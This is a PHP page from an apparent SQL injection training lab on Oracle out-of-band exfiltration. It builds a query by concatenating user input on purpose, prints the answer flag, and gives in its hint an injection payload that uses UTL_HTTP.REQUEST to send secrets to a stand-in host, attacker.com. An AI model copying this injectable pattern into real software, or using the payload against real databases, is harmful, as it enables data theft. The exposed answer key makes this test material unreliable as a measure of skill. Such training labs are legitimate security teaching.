<?php
require_once __DIR__ . '/../../includes/db.php';
$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* Flag verification */
if (isset($_POST['flag_input'])) {
    $submitted = trim($_POST['flag_input']);
    if ($submitted === 'FLAG{or_utl_http_00b}') {
        $_SESSION['oracle_lab9_solved'] = true;
        header("Location: " . url_lab_from_slug("oracle/lab9", $mode));
        exit;
    } else {
        $verify_error = "Incorrect flag. Keep trying!";
    }
}
?>

<?php if (!empty($driver_missing)): ?>
<div class="result-warning result-box" style="margin-bottom:16px;">
    <strong>Simulation Mode</strong>: <?= htmlspecialchars($driver_missing) ?> driver not installed.
    Query construction shown for learning. Install the driver for live execution.
</div>
<?php endif; ?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 9. Out-of-Band: UTL_HTTP.REQUEST</h3>

    <h4>Scenario</h4>
    <p>
        This document search application is truly blind: identical responses, no errors,
        and time-based techniques are blocked by query timeouts. The intended attack vector
        is <strong>Out-of-Band (OOB) exfiltration</strong> using <code>UTL_HTTP.REQUEST()</code>,
        which makes the Oracle database send an HTTP request to an attacker-controlled server
        with the stolen data embedded in the URL.
    </p>
    <p><strong>Oracle Concepts:</strong> <code>UTL_HTTP.REQUEST('http://attacker.com/' || data)</code>
    causes Oracle to make an outbound HTTP request. The stolen data is appended to the URL
    and captured on the attacker's server. Requires <code>EXECUTE</code> on <code>UTL_HTTP</code>
    and network ACL permissions.</p>
    <p><strong>Table Schema:</strong> <code>documents(id NUMBER, title VARCHAR2, author VARCHAR2, content CLOB)</code></p>
    <p><strong>Hidden Table:</strong> <code>oob_secrets(id NUMBER, secret VARCHAR2)</code></p>
    <p><em>Note: For this lab, use error-based extraction (CAST) to retrieve the flag.
    The solution explains the full OOB technique conceptually.</em></p>

    <h4>Objective</h4>
    <p>
        Use Out-of-Band exfiltration via <code>UTL_HTTP.REQUEST()</code> (or error-based fallback)
        to extract the secret and submit the flag.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Standard blind techniques are blocked: think out-of-band.<br>
        2. <code>UTL_HTTP.REQUEST()</code> can send data to an external server.<br>
        3. Alternatively, use error-based CAST to extract data through error messages.<br>
        4. Try: <code>' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT secret FROM oob_secrets WHERE ROWNUM=1)), NULL, NULL FROM DUAL -- </code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag_input" class="input" placeholder="FLAG{...}" required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?php echo htmlspecialchars($verify_error); ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['oracle_lab9_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully used Out-of-Band exfiltration via UTL_HTTP.REQUEST to extract the secret.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Document Search</h4>
    <form method="POST" class="form-row">
<input type="text" name="author" class="input" placeholder="Search by Author (e.g. Finance Team)" value="<?php echo htmlspecialchars($_POST['author'] ?? ''); ?>">
        <button type="submit" class="btn btn-primary">Search</button>
    </form>
</div>

<?php
if (isset($_POST['author'])) {
    $input = $_POST['author'];
    $query = "SELECT id, title, author FROM documents WHERE author = '$input'";

    echo '<div class="terminal">';
    echo '<div class="terminal-header">';
    echo '<span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span>';
    echo '<span class="terminal-title">Oracle Query</span>';
    echo '</div>';
    echo '<div class="terminal-body">';
    echo '<span class="prompt">SQL&gt; </span>' . htmlspecialchars($query);
    echo '</div></div>';

    if ($conn) {
        $stmt = @oci_parse($conn, $query);
        if ($stmt === false) {
            $e = oci_error($conn);
            echo '<div class="result-error result-box"><strong>Oracle Error:</strong><br>' . htmlspecialchars($e['message']) . '</div>';
        } else {
        $exec = @oci_execute($stmt);
        if ($exec) {
            $count = 0;
            echo '<div class="result-box">';
            while ($row = oci_fetch_assoc($stmt)) {
                echo '<p>';
                echo '<strong>ID:</strong> ' . htmlspecialchars($row['ID'] ?? '') . '<br>';
                echo '<strong>Title:</strong> ' . htmlspecialchars($row['TITLE'] ?? '') . '<br>';
                echo '<strong>Author:</strong> ' . htmlspecialchars($row['AUTHOR'] ?? '');
                echo '</p>';
                $count++;
            }
            if ($count === 0) {
                echo '<p>No documents found.</p>';
            }
            echo '</div>';
        } else {
            $e = oci_error($stmt);
            echo '<div class="result-error result-box"><strong>Oracle Error:</strong><br>' . htmlspecialchars($e['message']) . '</div>';
        }
}
    } else {
        echo '<div class="result-warning result-box">';
        echo '<strong>Simulation Mode:</strong> Query shown above for learning. Install the OCI8 driver for live results.';
        echo '</div>';
    }
}
?>

<?php endif; ?>
